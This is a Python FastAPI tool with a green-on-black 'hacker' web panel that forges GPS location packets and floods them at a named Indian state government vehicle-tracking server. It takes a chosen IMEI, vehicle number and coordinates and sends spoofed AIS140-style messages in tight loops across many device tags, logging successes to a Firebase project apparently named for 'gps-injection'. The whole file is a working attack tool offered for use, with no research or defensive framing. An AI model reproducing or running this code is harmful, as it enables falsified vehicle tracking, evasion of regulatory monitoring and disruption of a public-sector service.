import socket
import threading
import time
from datetime import datetime, timedelta, timezone
from fastapi import FastAPI, BackgroundTasks
from fastapi.responses import HTMLResponse
import firebase_admin
from firebase_admin import credentials, db

app = FastAPI()

# --- FIREBASE SETUP ---
try:
    cred = credentials.Certificate("serviceAccountKey.json")
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/'
    })
except Exception as e: print(f"Firebase Error: {e}")

# --- CONFIG & ENGINE LOGIC ---
firing = False
total_sent = 0
logs = []
TARGET_IP, TARGET_PORT = "vlts.bihar.gov.in", 9999
TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"]

def format_coord(val):
    p = str(val).split('.')
    return f"{p[0]}.{p[1][:7].ljust(7, '0')}" if len(p) > 1 else f"{val}.0000000"

def hyper_sonic_engine(tags, imei, vno, lat, lon):
    global firing, total_sent, logs
    while firing:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 0)
            s.settimeout(20)
            s.connect((TARGET_IP, TARGET_PORT))
            while firing:
                for tag in tags:
                    now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
                    dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
                    pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{format_coord(lat)},N,{format_coord(lon)},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\r\n"
                    s.sendall(pkt.encode('ascii'))
                    total_sent += 1
                    msg = f"[{tm}] {tag} >> SENT"
                    logs.append(msg)
                    if len(logs) > 8: logs.pop(0)
                db.reference('/Success_Reports').push({'vno': vno, 'packets': total_sent, 'time': datetime.now().strftime("%H:%M:%S")})
                time.sleep(0.001)
        except: time.sleep(0.5); continue
        finally: s.close()

# --- HACKER INTERFACE ---
@app.get("/", response_class=HTMLResponse)
async def home():
    return """
    <html><head><title>NITRO V82 PRO</title><style>
    body { background:#000; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
    .box { width:400px; border:1px solid #0f0; padding:20px; box-shadow:0 0 20px #0f0; border-radius:10px; background:rgba(0,10,0,0.9); }
    h2 { text-align:center; border-bottom:1px solid #0f0; padding-bottom:10px; text-shadow:0 0 5px #0f0; }
    input { width:100%; background:#000; border:1px solid #0f0; color:#0f0; padding:10px; margin:5px 0; outline:none; font-size:14px; }
    button { width:100%; padding:12px; margin-top:10px; background:transparent; color:#0f0; border:1px solid #0f0; cursor:pointer; font-weight:bold; }
    button:hover { background:#0f0; color:#000; }
    #log { height:150px; background:#001100; border:1px dotted #0f0; margin-top:15px; padding:10px; font-size:12px; overflow:hidden; }
    .stats { display:flex; justify-content:space-between; margin-top:10px; font-weight:bold; color:#fff; }
    </style></head><body>
    <div class="box">
        <h2>NITRO V82 PRO</h2>
        <input type="text" id="v" value="UP51T8261">
        <input type="text" id="i" value="358980101447242">
        <div style="display:flex; gap:10px;"><input type="text" id="lt" value="25.6501550"><input type="text" id="ln" value="84.7851780"></div>
        <button onclick="st()">INITIATE ATTACK</button>
        <button onclick="sp()" style="color:#f00; border-color:#f00;">ABORT SYSTEM</button>
        <div id="log">WAITING FOR COMMAND...</div>
        <div class="stats"><span>PACKETS: <span id="c">0</span></span><span id="s" style="color:#0f0">READY</span></div>
    </div>
    <script>
        let itv;
        function st() {
            const p = `vno=${document.getElementById('v').value}&imei=${document.getElementById('i').value}&lat=${document.getElementById('lt').value}&lon=${document.getElementById('ln').value}`;
            fetch(`/start?${p}`); document.getElementById('s').innerText = "RUNNING";
            if(!itv) itv = setInterval(() => {
                fetch('/status').then(r=>r.json()).then(d=>{
                    document.getElementById('c').innerText = d.total;
                    document.getElementById('log').innerHTML = d.logs.join("<br>");
                });
            }, 1000);
        }
        function sp() { fetch('/stop'); document.getElementById('s').innerText = "STOPPED"; clearInterval(itv); itv=null; }
    </script></body></html>
    """

@app.get("/start")
def start(background_tasks: BackgroundTasks, imei: str, vno: str, lat: str, lon: str):
    global firing, total_sent, logs
    if not firing:
        firing, total_sent, logs = True, 0, ["ENGINE STARTING..."]
        chunks = [TAGS[i:i + 4] for i in range(0, len(TAGS), 4)]
        for chunk in chunks: background_tasks.add_task(hyper_sonic_engine, chunk, imei, vno.upper(), lat, lon)
    return {"ok": True}

@app.get("/stop")
def stop():
    global firing
    firing = False
    return {"ok": True}

@app.get("/status")
def get_status():
    return {"total": total_sent, "logs": logs}
